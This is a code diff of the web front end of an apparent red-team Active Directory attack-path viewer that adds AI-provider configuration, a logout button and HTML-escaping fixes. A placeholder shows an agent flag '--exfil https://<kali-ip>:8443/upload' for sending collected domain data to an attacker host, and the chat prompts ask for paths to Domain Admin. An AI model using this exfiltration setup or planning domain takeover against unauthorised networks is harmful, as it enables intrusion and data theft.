@@ -9,21 +9,22 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/cytoscape/3.28.1/cytoscape.min.js"></script>
   <style>
     :root {
-      --bg:          #070509;
-      --bg-panel:    #0b080e;
-      --bg-sidebar:  #090610;
-      --border:      #2d0020;
-      --border-hot:  #7a0030;
-      --text:        #c8c8cc;
-      --text-dim:    #555;
+      --bg:          #0f1117;
+      --bg-panel:    #13161e;
+      --bg-sidebar:  #111420;
+      --border:      #2a2d40;
+      --border-hot:  #8a2060;
+      --text:        #d4d6e0;
+      --text-dim:    #8a8fa8;
       --red:         #c0392b;
       --red-bright:  #e74c3c;
-      --red-dark:    #7a0000;
-      --purple:      #8e44ad;
-      --purple-dim:  #4a1870;
+      --red-dark:    #8b0000;
+      --purple:      #9b59b6;
+      --purple-dim:  #5a2280;
       --gold:        #d4ac0d;
       --cyan:        #1abc9c;
       --green:       #27ae60;
+      --orange:      #e67e22;
       --mono:        'Share Tech Mono', 'Courier New', monospace;
       --title:       'Cinzel', serif;
     }
@@ -46,10 +47,10 @@
       align-items: center;
       justify-content: space-between;
       padding: 10px 22px;
-      background: linear-gradient(135deg, #0d0005 0%, #180010 50%, #0d0005 100%);
+      background: linear-gradient(135deg, #0d0a14 0%, #1a1030 50%, #0d0a14 100%);
       border-bottom: 1px solid var(--border-hot);
       flex-shrink: 0;
-      gap: 16px;
+      gap: 12px;
     }
 
     #header-title {
@@ -59,22 +60,57 @@
       color: var(--red-bright);
       text-shadow: 0 0 18px rgba(231,76,60,.6), 0 0 40px rgba(231,76,60,.2);
       white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    #header-center {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 3px;
+      min-width: 0;
     }
 
     #header-status {
       font-size: 11px;
       color: var(--text-dim);
       letter-spacing: 1px;
-      flex: 1;
-      text-align: center;
       transition: color .3s;
     }
     #header-status.connected { color: var(--green); }
     #header-status.loaded    { color: var(--gold);  }
     #header-status.error     { color: var(--red-bright); }
 
+    #ai-badge {
+      font-size: 10px;
+      letter-spacing: 1px;
+      color: var(--purple);
+      background: rgba(90,34,128,.18);
+      border: 1px solid rgba(90,34,128,.5);
+      padding: 2px 10px;
+      border-radius: 2px;
+      white-space: nowrap;
+      cursor: pointer;
+      transition: all .18s;
+    }
+    #ai-badge:hover {
+      background: rgba(90,34,128,.35);
+      border-color: var(--purple);
+      color: #c07cef;
+    }
+    #ai-badge.unconfigured {
+      color: var(--orange);
+      border-color: rgba(230,126,34,.5);
+      background: rgba(230,126,34,.1);
+      animation: pulse-warn 2s infinite;
+    }
+    @keyframes pulse-warn {
+      0%,100% { opacity:1; } 50% { opacity:.6; }
+    }
+
     .btn {
-      background: linear-gradient(135deg, #18000a, #280010);
+      background: linear-gradient(135deg, #18121a, #281630);
       color: var(--red);
       border: 1px solid var(--border-hot);
       padding: 6px 14px;
@@ -86,7 +122,7 @@
       white-space: nowrap;
     }
     .btn:hover {
-      background: linear-gradient(135deg, #260010, #380018);
+      background: linear-gradient(135deg, #261020, #381840);
       color: var(--red-bright);
       box-shadow: 0 0 12px rgba(231,76,60,.35);
     }
@@ -95,8 +131,20 @@
       border-color: var(--purple-dim);
     }
     .btn-purple:hover {
-      color: #be6ff0;
-      box-shadow: 0 0 12px rgba(142,68,173,.4);
+      color: #c07cef;
+      box-shadow: 0 0 12px rgba(155,89,182,.4);
+    }
+    .btn-ghost {
+      background: transparent;
+      color: var(--text-dim);
+      border-color: var(--border);
+      font-size: 10px;
+      padding: 4px 10px;
+    }
+    .btn-ghost:hover {
+      color: var(--text);
+      border-color: var(--text-dim);
+      box-shadow: none;
     }
 
     /* ── Layout ─────────────────────────────────────────────────────────────── */
@@ -110,7 +158,7 @@
     #graph-panel {
       flex: 7;
       position: relative;
-      background: radial-gradient(ellipse at 40% 40%, #0e0015 0%, #070509 65%);
+      background: radial-gradient(ellipse at 40% 40%, #14101e 0%, #0f1117 65%);
       border-right: 1px solid var(--border-hot);
       overflow: hidden;
     }
@@ -129,7 +177,7 @@
 
     #graph-search {
       width: 210px;
-      background: rgba(10,0,12,.88);
+      background: rgba(15,17,23,.92);
       border: 1px solid var(--border);
       color: var(--text);
       padding: 6px 10px;
@@ -138,11 +186,11 @@
       outline: none;
       transition: border-color .2s;
     }
-    #graph-search:focus { border-color: var(--red-dark); }
+    #graph-search:focus { border-color: var(--border-hot); }
     #graph-search::placeholder { color: var(--text-dim); }
 
     #graph-stats {
-      background: rgba(10,0,12,.78);
+      background: rgba(15,17,23,.82);
       border: 1px solid var(--border);
       padding: 5px 10px;
       font-size: 11px;
@@ -155,12 +203,12 @@
       bottom: 14px;
       left: 14px;
       width: 270px;
-      background: rgba(9,5,14,.95);
+      background: rgba(13,16,24,.97);
       border: 1px solid var(--border-hot);
       padding: 14px;
       display: none;
       z-index: 10;
-      box-shadow: 0 0 24px rgba(122,0,48,.3);
+      box-shadow: 0 0 24px rgba(138,32,96,.25);
     }
     #node-info-title {
       font-family: var(--title);
@@ -197,7 +245,7 @@
       position: absolute;
       bottom: 14px;
       right: 14px;
-      background: rgba(9,5,14,.82);
+      background: rgba(13,16,24,.88);
       border: 1px solid var(--border);
       padding: 10px 13px;
       font-size: 10px;
@@ -217,7 +265,7 @@
 
     #sidebar-header {
       padding: 13px 16px;
-      background: linear-gradient(135deg, #0c0008, #180014);
+      background: linear-gradient(135deg, #0e0a18, #1a1030);
       border-bottom: 1px solid var(--border-hot);
       font-family: var(--title);
       color: var(--red-bright);
@@ -244,13 +292,33 @@
     }
     #analysis-content {
       font-size: 11.5px;
-      line-height: 1.65;
+      line-height: 1.7;
       color: var(--text);
-      white-space: pre-wrap;
     }
-    #analysis-content .crit   { color: #e74c3c; font-weight: bold; }
-    #analysis-content .high   { color: #e67e22; }
-    #analysis-content .medium { color: var(--gold); }
+
+    /* Severity markers */
+    .sev-critical { color: #e74c3c; font-weight: bold; }
+    .sev-high     { color: #e67e22; font-weight: bold; }
+    .sev-medium   { color: var(--gold); font-weight: bold; }
+
+    /* Analysis markdown rendering */
+    .analysis-h2 {
+      font-family: var(--title);
+      font-size: 12px;
+      letter-spacing: 2px;
+      color: var(--red-bright);
+      border-bottom: 1px solid rgba(231,76,60,.2);
+      padding-bottom: 3px;
+      margin: 12px 0 6px;
+    }
+    .analysis-h3 {
+      font-size: 11px;
+      letter-spacing: 1px;
+      color: var(--purple);
+      margin: 8px 0 4px;
+    }
+    .analysis-line { display: block; margin: 2px 0; white-space: pre-wrap; word-break: break-word; }
+
     .placeholder { color: var(--text-dim); font-style: italic; font-size: 12px; }
     .spin { animation: spin 1s linear infinite; display:inline-block; }
     @keyframes spin { to { transform:rotate(360deg); } }
@@ -265,7 +333,7 @@
     }
     #chat-header {
       padding: 9px 15px;
-      background: rgba(50,0,40,.35);
+      background: rgba(26,16,40,.5);
       border-bottom: 1px solid var(--border);
       font-size: 10px;
       color: var(--purple);
@@ -290,19 +358,19 @@
       word-break: break-word;
     }
     .chat-msg.user {
-      background: rgba(35,0,20,.85);
+      background: rgba(40,16,28,.85);
       border-left: 2px solid var(--red-dark);
       color: #e0a0a0;
       align-self: flex-end;
     }
     .chat-msg.assistant {
-      background: rgba(18,0,28,.85);
+      background: rgba(20,14,34,.85);
       border-left: 2px solid var(--purple-dim);
       color: var(--text);
       align-self: flex-start;
     }
     .chat-msg.system {
-      background: rgba(0,16,14,.6);
+      background: rgba(10,20,18,.7);
       border-left: 2px solid #1a6b5a;
       color: var(--text-dim);
       font-size: 11px;
@@ -316,12 +384,12 @@
       padding: 9px 10px;
       border-top: 1px solid var(--border);
       flex-shrink: 0;
-      background: rgba(5,0,10,.5);
+      background: rgba(10,12,18,.6);
     }
     #chat-row { display:flex; gap:7px; }
     #chat-input {
       flex: 1;
-      background: rgba(12,0,10,.9);
+      background: rgba(15,17,23,.95);
       border: 1px solid var(--border);
       color: var(--text);
       padding: 7px 10px;
@@ -336,7 +404,7 @@
     #chat-input:disabled { opacity: .4; }
     #chat-input::placeholder { color: var(--text-dim); font-size: 11px; }
     #chat-send {
-      background: linear-gradient(135deg, #150020, #220035);
+      background: linear-gradient(135deg, #180028, #260040);
       color: var(--purple);
       border: 1px solid var(--purple-dim);
       padding: 8px 13px;
@@ -348,30 +416,30 @@
       display: flex;
       align-items: center;
     }
-    #chat-send:hover { background: linear-gradient(135deg,#200030,#320050); color:#be6ff0; box-shadow:0 0 12px rgba(142,68,173,.4); }
+    #chat-send:hover { background: linear-gradient(135deg, #220038, #340058); color:#c07cef; box-shadow:0 0 12px rgba(155,89,182,.4); }
     #chat-send:disabled { opacity:.35; cursor:not-allowed; }
     #chat-hint { font-size:10px; color:var(--text-dim); margin-top:5px; }
 
-    /* ── Modal ──────────────────────────────────────────────────────────────── */
-    #modal-overlay {
+    /* ── Modals ─────────────────────────────────────────────────────────────── */
+    .modal-overlay {
       display: none;
       position: fixed;
       inset: 0;
-      background: rgba(0,0,0,.88);
+      background: rgba(0,0,0,.82);
       z-index: 1000;
       align-items: center;
       justify-content: center;
     }
-    #modal-overlay.show { display:flex; }
-    #modal {
-      background: linear-gradient(135deg, #0c0008, #160013);
+    .modal-overlay.show { display:flex; }
+    .modal-box {
+      background: linear-gradient(135deg, #0e0a18, #181230);
       border: 1px solid var(--border-hot);
       padding: 28px 30px;
-      width: 500px;
+      width: 520px;
       max-width: 94vw;
-      box-shadow: 0 0 50px rgba(122,0,48,.4);
+      box-shadow: 0 0 50px rgba(138,32,96,.35);
     }
-    #modal h2 {
+    .modal-box h2 {
       font-family: var(--title);
       color: var(--red-bright);
       font-size: 16px;
@@ -382,19 +450,75 @@
     .form-group { margin-bottom:15px; }
     .form-group label { display:block; font-size:10px; color:var(--text-dim); letter-spacing:1px; margin-bottom:5px; }
     .form-group input[type=text],
-    .form-group input[type=file] {
+    .form-group input[type=password],
+    .form-group input[type=file],
+    .form-group select {
       width:100%;
-      background: rgba(12,0,10,.9);
+      background: rgba(15,17,23,.95);
       border: 1px solid var(--border);
       color: var(--text);
-      padding: 7px 10px;
+      padding: 8px 10px;
       font-family: var(--mono);
       font-size: 12px;
       outline: none;
     }
-    .form-group input:focus { border-color: var(--red-dark); }
-    #modal-err { color:var(--red-bright); font-size:12px; margin-top:8px; display:none; }
-    #modal-actions { display:flex; justify-content:flex-end; gap:10px; margin-top:20px; }
+    .form-group select option { background: #13161e; }
+    .form-group input:focus,
+    .form-group select:focus { border-color: var(--border-hot); }
+    .modal-err { color:var(--red-bright); font-size:12px; margin-top:8px; display:none; }
+    .modal-ok  { color:var(--green); font-size:12px; margin-top:8px; display:none; }
+    .modal-actions { display:flex; justify-content:flex-end; gap:10px; margin-top:20px; }
+
+    /* Provider cards */
+    .provider-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+    .provider-card {
+      border: 1px solid var(--border);
+      padding: 10px 8px;
+      text-align: center;
+      cursor: pointer;
+      transition: all .18s;
+      background: rgba(15,17,23,.8);
+    }
+    .provider-card:hover {
+      border-color: var(--purple-dim);
+      background: rgba(90,34,128,.12);
+    }
+    .provider-card.selected {
+      border-color: var(--purple);
+      background: rgba(90,34,128,.25);
+      box-shadow: 0 0 10px rgba(155,89,182,.2);
+    }
+    .provider-icon { font-size: 20px; display: block; margin-bottom: 4px; }
+    .provider-name { font-size: 10px; letter-spacing: 1px; color: var(--text); }
+    .provider-sub  { font-size: 9px; color: var(--text-dim); margin-top: 2px; }
+
+    /* Key input with show/hide */
+    .key-wrap { position: relative; }
+    .key-wrap input { padding-right: 38px; }
+    .key-eye {
+      position: absolute;
+      right: 8px; top: 50%; transform: translateY(-50%);
+      background: none; border: none; color: var(--text-dim);
+      cursor: pointer; font-size: 13px; padding: 2px 4px;
+      transition: color .15s;
+    }
+    .key-eye:hover { color: var(--purple); }
+
+    /* Key status indicator */
+    .key-status {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 10px;
+      margin-top: 5px;
+    }
+    .key-status.set   { color: var(--green); }
+    .key-status.unset { color: var(--orange); }
 
     /* ── Scrollbars ─────────────────────────────────────────────────────────── */
     ::-webkit-scrollbar { width:5px; height:5px; }
@@ -407,10 +531,18 @@
 
 <!-- ── Header ───────────────────────────────────────────────────────────────── -->
 <div id="header">
-  <div id="header-title">☠ NECROMANCER v2 — THE GRIMOIRE ☠</div>
-  <div id="header-status">● CONNECTING...</div>
-  <div style="display:flex;gap:8px;flex-shrink:0;">
+  <div id="header-title">☠ THE GRIMOIRE</div>
+
+  <div id="header-center">
+    <div id="header-status">● CONNECTING...</div>
+    <div id="ai-badge" onclick="openAIModal()" title="Click to configure AI backend">
+      ⚙ loading...
+    </div>
+  </div>
+
+  <div style="display:flex;gap:8px;flex-shrink:0;align-items:center;">
     <button class="btn btn-purple" onclick="openModal()">⚡ OFFLINE UPLOAD</button>
+    <button class="btn btn-ghost" onclick="logout()">⎋ LOGOUT</button>
   </div>
 </div>
 
@@ -443,7 +575,9 @@
       <div class="leg-item"><div class="leg-dot" style="background:#2e86c1"></div>Computer</div>
       <div class="leg-item"><div class="leg-dot" style="background:#b7950b"></div>Domain</div>
       <div class="leg-item"><div class="leg-dot" style="background:#1e8449"></div>GPO</div>
+      <div class="leg-item"><div class="leg-dot" style="background:#2874a6"></div>OU</div>
       <div class="leg-item"><div class="leg-dot" style="background:#ad1457"></div>CertTemplate</div>
+      <div class="leg-item"><div class="leg-dot" style="background:#880e4f"></div>EnterpriseCA</div>
     </div>
   </div>
 
@@ -457,7 +591,7 @@
       <div id="analysis-content">
         <span class="placeholder">Awaiting data ingestion...<br><br>
 Connect an agent with <code style="color:#e74c3c">--exfil https://&lt;kali-ip&gt;:8443/upload</code><br>
-or click <strong style="color:#8e44ad">⚡ OFFLINE UPLOAD</strong> to load existing data.</span>
+or click <strong style="color:#9b59b6">⚡ OFFLINE UPLOAD</strong> to load existing data.</span>
       </div>
       <button class="btn" id="re-analyze-btn" onclick="triggerInitialAnalysis()" style="display:none">↻ RE-ANALYZE</button>
     </div>
@@ -471,7 +605,7 @@ or click <strong style="color:#8e44ad">⚡ OFFLINE UPLOAD</strong> to load exist
       <div id="chat-input-area">
         <div id="chat-row">
           <textarea id="chat-input"
-            placeholder='"What if I compromise DC1?" • "Show path to Domain Admin from SMSASIMON" • "Find Kerberoastable paths to DA"'
+            placeholder='"What if I compromise DC1?" • "Show path to Domain Admin" • "Find Kerberoastable paths"'
             disabled></textarea>
           <button id="chat-send" onclick="sendChat()" disabled title="Send (Enter)">☠</button>
         </div>
@@ -482,8 +616,8 @@ or click <strong style="color:#8e44ad">⚡ OFFLINE UPLOAD</strong> to load exist
 </div>
 
 <!-- ── Offline upload modal ──────────────────────────────────────────────────── -->
-<div id="modal-overlay" onclick="if(event.target===this)closeModal()">
-  <div id="modal">
+<div id="modal-overlay" class="modal-overlay" onclick="if(event.target===this)closeModal()">
+  <div class="modal-box">
     <h2>⚡ OFFLINE DATA INGESTION</h2>
     <p class="modal-sub">Upload an encrypted <code>adn_data.zip</code> and its decryption key.</p>
 
@@ -502,11 +636,81 @@ or click <strong style="color:#8e44ad">⚡ OFFLINE UPLOAD</strong> to load exist
       <input type="text" id="m-key-hex" placeholder="Paste 64-char hex or use key file above…">
     </div>
 
-    <div id="modal-err"></div>
+    <div id="modal-err" class="modal-err"></div>
 
-    <div id="modal-actions">
+    <div class="modal-actions">
       <button class="btn" onclick="closeModal()">CANCEL</button>
       <button class="btn btn-purple" onclick="submitOfflineLoad()">☠ RAISE THE DEAD</button>
+    </div>
+  </div>
+</div>
+
+<!-- ── AI Backend config modal ───────────────────────────────────────────────── -->
+<div id="ai-modal-overlay" class="modal-overlay" onclick="if(event.target===this)closeAIModal()">
+  <div class="modal-box">
+    <h2>⚙ AI BACKEND CONFIGURATION</h2>
+    <p class="modal-sub">Select your AI provider and enter your API key. Keys are stored locally in <code>grimoire_ai.json</code> and never transmitted.</p>
+
+    <!-- Provider selector -->
+    <div class="form-group">
+      <label>SELECT PROVIDER</label>
+      <div class="provider-grid">
+        <div class="provider-card" data-provider="claude" onclick="selectProvider('claude')">
+          <span class="provider-icon">🧠</span>
+          <div class="provider-name">CLAUDE</div>
+          <div class="provider-sub">Anthropic</div>
+        </div>
+        <div class="provider-card" data-provider="openai" onclick="selectProvider('openai')">
+          <span class="provider-icon">✦</span>
+          <div class="provider-name">OPENAI</div>
+          <div class="provider-sub">GPT-4o</div>
+        </div>
+        <div class="provider-card" data-provider="deepseek" onclick="selectProvider('deepseek')">
+          <span class="provider-icon">🌊</span>
+          <div class="provider-name">DEEPSEEK</div>
+          <div class="provider-sub">deepseek-chat</div>
+        </div>
+        <div class="provider-card" data-provider="gemini" onclick="selectProvider('gemini')">
+          <span class="provider-icon">♊</span>
+          <div class="provider-name">GEMINI</div>
+          <div class="provider-sub">Google</div>
+        </div>
+        <div class="provider-card" data-provider="ollama" onclick="selectProvider('ollama')">
+          <span class="provider-icon">🦙</span>
+          <div class="provider-name">OLLAMA</div>
+          <div class="provider-sub">Local / On-Prem</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Model name -->
+    <div class="form-group">
+      <label>MODEL NAME <span style="color:var(--text-dim)">(leave blank for default)</span></label>
+      <input type="text" id="ai-model" placeholder="e.g. claude-opus-4-5, gpt-4o, llama3…">
+    </div>
+
+    <!-- API Key -->
+    <div class="form-group" id="ai-key-group">
+      <label>API KEY</label>
+      <div class="key-wrap">
+        <input type="password" id="ai-key" placeholder="sk-… or paste your key here">
+        <button class="key-eye" onclick="toggleKeyVis()" type="button" tabindex="-1">👁</button>
+      </div>
+      <div id="ai-key-status" class="key-status unset">✗ No key saved</div>
+    </div>
+
+    <!-- Ollama endpoint (only for ollama) -->
+    <div class="form-group" id="ai-endpoint-group" style="display:none">
+      <label>OLLAMA BASE URL</label>
+      <input type="text" id="ai-endpoint" placeholder="http://localhost:11434">
+    </div>
+
+    <div id="ai-modal-err" class="modal-err"></div>
+    <div id="ai-modal-ok" class="modal-ok"></div>
+
+    <div class="modal-actions">
+      <button class="btn" onclick="closeAIModal()">CANCEL</button>
+      <button class="btn btn-purple" onclick="saveAIConfig()">☠ SAVE & ACTIVATE</button>
     </div>
   </div>
 </div>
@@ -521,6 +725,9 @@ let chatHistory   = [];
 let selectedNode  = null;
 let analysisReady = false;
 let edgeIdx       = 0;
+let selectedProvider = 'claude';
+
+const MAX_CHAT_HISTORY = 40;
 
 // Node type colour palette
 const TYPE_COLORS = {
@@ -534,6 +741,15 @@ const TYPE_COLORS = {
   EnterpriseCA: { bg:'#1a000c', border:'#880e4f', text:'#f48fb1' },
 };
 
+// Provider defaults
+const PROVIDER_DEFAULTS = {
+  claude:   { model: 'claude-opus-4-5',  keyLabel: 'Anthropic API Key (sk-ant-…)' },
+  openai:   { model: 'gpt-4o',           keyLabel: 'OpenAI API Key (sk-…)' },
+  deepseek: { model: 'deepseek-chat',    keyLabel: 'DeepSeek API Key' },
+  gemini:   { model: 'gemini-1.5-pro',   keyLabel: 'Google AI Studio Key (AIza…)' },
+  ollama:   { model: 'llama3',           keyLabel: null }, // no key needed
+};
+
 // ── SSE ───────────────────────────────────────────────────────────────────────
 const evtSource = new EventSource('/api/events');
 evtSource.onopen  = () => setStatus('● CONNECTED — AWAITING DATA', 'connected');
@@ -542,6 +758,30 @@ evtSource.onmessage = e => {
   try { loadGraph(JSON.parse(e.data)); }
   catch(err) { console.error('SSE parse:', err); }
 };
+
+// ── AI Badge ─────────────────────────────────────────────────────────────────
+async function refreshAIBadge() {
+  try {
+    const res  = await fetch('/api/ai-info');
+    const data = await res.json();
+    const badge = document.getElementById('ai-badge');
+    const providerLabel = data.provider ? data.provider.toUpperCase() : '?';
+    const modelShort = (data.model || '').split('-').slice(0,3).join('-');
+
+    if (data.key_configured) {
+      badge.textContent = `⚙ ${providerLabel} · ${modelShort}`;
+      badge.classList.remove('unconfigured');
+      badge.title = `AI Backend: ${data.provider} / ${data.model} — Click to change`;
+    } else {
+      badge.textContent = `⚙ ${providerLabel} — NO KEY ⚠`;
+      badge.classList.add('unconfigured');
+      badge.title = 'No API key configured — click to set up';
+    }
+  } catch(e) {
+    document.getElementById('ai-badge').textContent = '⚙ AI BACKEND';
+  }
+}
+refreshAIBadge();
 
 // ── Graph Loading ─────────────────────────────────────────────────────────────
 function loadGraph(data) {
@@ -650,11 +890,11 @@ function buildStyle() {
     {
       selector: 'node',
       style: {
-        'background-color': '#1a0020',
+        'background-color': '#1e1830',
         'border-width': 2,
-        'border-color': '#5a0040',
+        'border-color': '#5a3070',
         'label': 'data(label)',
-        'color': '#aaa',
+        'color': '#b0b0c0',
         'font-size': '9px',
         'font-family': '"Share Tech Mono", monospace',
         'text-valign': 'bottom',
@@ -688,22 +928,22 @@ function buildStyle() {
     style: { 'border-color': '#ffd700', 'border-width': 3, 'width': 54, 'height': 54 } });
 
   // Dimmed
-  s.push({ selector: 'node.dimmed',  style: { 'opacity': 0.12 } });
+  s.push({ selector: 'node.dimmed',  style: { 'opacity': 0.14 } });
   s.push({ selector: 'edge.dimmed',  style: { 'opacity': 0.06 } });
 
   // Base edge
   s.push({ selector: 'edge', style: {
-    'line-color': '#3a0030',
+    'line-color': '#3a2850',
     'width': 1.5,
-    'target-arrow-color': '#7a0050',
+    'target-arrow-color': '#7a3090',
     'target-arrow-shape': 'triangle',
     'curve-style': 'bezier',
     'label': 'data(label)',
     'font-size': '8px',
-    'color': '#555',
+    'color': '#6a6a8a',
     'font-family': '"Share Tech Mono", monospace',
     'text-rotation': 'autorotate',
-    'text-background-color': '#070509',
+    'text-background-color': '#0f1117',
     'text-background-opacity': 0.8,
     'text-background-padding': '2px',
     'overlay-opacity': 0,
@@ -763,8 +1003,8 @@ function showNodeInfo(node) {
 
   document.getElementById('node-props').innerHTML = props.map(([k,v]) => {
     const warn = (k==='Enabled'&&!d.enabled)||(k==='AdminCount'&&d.admincount);
-    return `<div class="node-prop"><span class="np-k">${k}</span>
-            <span class="np-v${warn?' warn':''}" title="${v}">${v}</span></div>`;
+    return `<div class="node-prop"><span class="np-k">${esc(k)}</span>
+            <span class="np-v${warn?' warn':''}" title="${esc(v)}">${esc(v)}</span></div>`;
   }).join('');
 
   document.getElementById('node-info').style.display = 'block';
@@ -798,7 +1038,6 @@ function searchGraph(q) {
 // ── Tokenization ──────────────────────────────────────────────────────────────
 function tokenize(text) {
   let r = text;
-  // Process longest names first to avoid partial matches
   const entries = Object.entries(tokenMap).sort((a,b) => b[0].length - a[0].length);
   for (const [real, tok] of entries) {
     if (real && tok) r = r.split(real).join(tok);
@@ -833,6 +1072,10 @@ async function sendChat() {
   inp.value = '';
 
   chatHistory.push({ role: 'user', content: tokenized });
+  // Cap history to avoid memory bloat
+  if (chatHistory.length > MAX_CHAT_HISTORY) {
+    chatHistory.splice(0, chatHistory.length - MAX_CHAT_HISTORY);
+  }
 
   const tempId = addMsg('assistant', '☠ Consulting the Grimoire… ⟳', true);
 
@@ -842,7 +1085,7 @@ async function sendChat() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         message: tokenized,
-        history: chatHistory.slice(-20), // last 20 turns
+        history: chatHistory.slice(-20),
         summary: graphSummary,
       }),
     });
@@ -854,7 +1097,10 @@ async function sendChat() {
     } else {
       const reply = detokenize(data.reply);
       addMsg('assistant', reply);
-      chatHistory.push({ role: 'assistant', content: data.reply }); // keep tokenized in history
+      chatHistory.push({ role: 'assistant', content: data.reply });
+      if (chatHistory.length > MAX_CHAT_HISTORY) {
+        chatHistory.splice(0, chatHistory.length - MAX_CHAT_HISTORY);
+      }
     }
   } catch (err) {
     document.getElementById(tempId)?.remove();
@@ -881,7 +1127,7 @@ function addMsg(role, content, isTemp = false) {
   }
 
   const txt = document.createElement('div');
-  txt.textContent = content;
+  txt.textContent = content;  // safe: textContent never injects HTML
   div.appendChild(txt);
   msgs.appendChild(div);
   msgs.scrollTop = msgs.scrollHeight;
@@ -914,12 +1160,47 @@ async function triggerInitialAnalysis() {
   }
 }
 
+// Safe HTML escaping
+function esc(s) {
+  return String(s)
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;');
+}
+
+// Format AI analysis output — safely escape first, then apply styling
 function formatAnalysis(text) {
-  return text
-    .replace(/CRITICAL/g, '<span class="crit">CRITICAL</span>')
-    .replace(/HIGH/g,     '<span class="high">HIGH</span>')
-    .replace(/MEDIUM/g,   '<span class="medium">MEDIUM</span>')
-    .replace(/\n/g, '<br>');
+  const lines = text.split('\n');
+  const out   = [];
+
+  for (let line of lines) {
+    // Escape raw HTML
+    let safe = esc(line);
+
+    // Markdown: ## Header → styled div
+    if (/^##\s/.test(line)) {
+      out.push(`<div class="analysis-h2">${esc(line.replace(/^##\s+/,''))}</div>`);
+      continue;
+    }
+    // Markdown: ### Header
+    if (/^###\s/.test(line)) {
+      out.push(`<div class="analysis-h3">${esc(line.replace(/^###\s+/,''))}</div>`);
+      continue;
+    }
+
+    // Severity markers — word-boundary safe (after HTML escape)
+    safe = safe.replace(/\bCRITICAL\b/g, '<span class="sev-critical">CRITICAL</span>');
+    safe = safe.replace(/\bHIGH\b/g,     '<span class="sev-high">HIGH</span>');
+    safe = safe.replace(/\bMEDIUM\b/g,   '<span class="sev-medium">MEDIUM</span>');
+
+    // **bold** (after escaping, ** are still literal)
+    safe = safe.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+
+    out.push(`<span class="analysis-line">${safe}</span>`);
+  }
+
+  return out.join('\n');
 }
 
 // ── Status bar ────────────────────────────────────────────────────────────────
@@ -929,7 +1210,16 @@ function setStatus(msg, cls) {
   el.className   = cls;
 }
 
-// ── Modal ─────────────────────────────────────────────────────────────────────
+// ── Logout ────────────────────────────────────────────────────────────────────
+async function logout() {
+  try {
+    await fetch('/api/logout', { method: 'POST' });
+  } finally {
+    window.location.href = '/login';
+  }
+}
+
+// ── Offline Upload Modal ──────────────────────────────────────────────────────
 function openModal()  { document.getElementById('modal-overlay').classList.add('show'); }
 function closeModal() {
   document.getElementById('modal-overlay').classList.remove('show');
@@ -978,6 +1268,118 @@ async function submitOfflineLoad() {
     errEl.textContent = `⚠ ${err.message}`;
     errEl.style.display = 'block';
     setStatus('● ERROR LOADING DATA', 'error');
+  }
+}
+
+// ── AI Backend Modal ──────────────────────────────────────────────────────────
+async function openAIModal() {
+  // Load current config from server
+  try {
+    const res  = await fetch('/api/ai-config');
+    const data = await res.json();
+    selectedProvider = data.provider || 'claude';
+
+    // Mark selected card
+    document.querySelectorAll('.provider-card').forEach(c => {
+      c.classList.toggle('selected', c.dataset.provider === selectedProvider);
+    });
+
+    document.getElementById('ai-model').value    = data.model    || '';
+    document.getElementById('ai-endpoint').value = data.endpoint || '';
+    document.getElementById('ai-key').value = ''; // Never pre-fill key
+
+    updateKeyStatus(data.key_configured);
+    updateEndpointVisibility(selectedProvider);
+  } catch(e) { /* ignore */ }
+
+  document.getElementById('ai-modal-err').style.display = 'none';
+  document.getElementById('ai-modal-ok').style.display  = 'none';
+  document.getElementById('ai-modal-overlay').classList.add('show');
+}
+
+function closeAIModal() {
+  document.getElementById('ai-modal-overlay').classList.remove('show');
+}
+
+function selectProvider(p) {
+  selectedProvider = p;
+  document.querySelectorAll('.provider-card').forEach(c => {
+    c.classList.toggle('selected', c.dataset.provider === p);
+  });
+  updateEndpointVisibility(p);
+
+  // Clear key field on provider switch
+  document.getElementById('ai-key').value = '';
+  document.getElementById('ai-key-status').textContent = '✗ Enter new key';
+  document.getElementById('ai-key-status').className   = 'key-status unset';
+
+  // Update key label
+  const defaults = PROVIDER_DEFAULTS[p];
+  if (p === 'ollama') {
+    document.getElementById('ai-key-group').style.display = 'none';
+  } else {
+    document.getElementById('ai-key-group').style.display = 'block';
+    document.getElementById('ai-key').placeholder = defaults?.keyLabel || 'API Key';
+  }
+}
+
+function updateEndpointVisibility(p) {
+  document.getElementById('ai-endpoint-group').style.display = p === 'ollama' ? 'block' : 'none';
+  document.getElementById('ai-key-group').style.display      = p === 'ollama' ? 'none'  : 'block';
+}
+
+function updateKeyStatus(configured) {
+  const el = document.getElementById('ai-key-status');
+  if (configured) {
+    el.textContent = '✓ Key configured (leave blank to keep existing)';
+    el.className   = 'key-status set';
+  } else {
+    el.textContent = '✗ No key saved';
+    el.className   = 'key-status unset';
+  }
+}
+
+function toggleKeyVis() {
+  const inp = document.getElementById('ai-key');
+  inp.type = inp.type === 'password' ? 'text' : 'password';
+}
+
+async function saveAIConfig() {
+  const errEl = document.getElementById('ai-modal-err');
+  const okEl  = document.getElementById('ai-modal-ok');
+  errEl.style.display = 'none';
+  okEl.style.display  = 'none';
+
+  const provider = selectedProvider;
+  const apiKey   = document.getElementById('ai-key').value.trim();
+  const model    = document.getElementById('ai-model').value.trim();
+  const endpoint = document.getElementById('ai-endpoint').value.trim();
+
+  try {
+    const res = await fetch('/api/ai-config', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ provider, api_key: apiKey, model, endpoint }),
+    });
+    const data = await res.json();
+
+    if (!res.ok || data.error) {
+      errEl.textContent = '⚠ ' + (data.error || 'Failed to save config');
+      errEl.style.display = 'block';
+      return;
+    }
+
+    okEl.textContent = `✓ Activated: ${data.provider} · ${data.model}`;
+    okEl.style.display = 'block';
+
+    // Refresh badge
+    await refreshAIBadge();
+
+    // Auto-close after short delay
+    setTimeout(closeAIModal, 1400);
+  } catch(err) {
+    errEl.textContent = '⚠ Network error: ' + err.message;
+    errEl.style.display = 'block';
   }
 }
 
